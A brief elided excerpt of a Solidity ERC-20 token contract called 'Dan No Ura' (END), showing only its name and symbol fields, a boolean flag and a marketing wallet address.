...
contract END is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "Dan No Ura";
    string public _symbol= "END";
    bool balances1 = true;
    ...
    address private marketAddy = payable(0x8125EaD6946E70b80d7ceD9095ffc0365D1bB2D7);
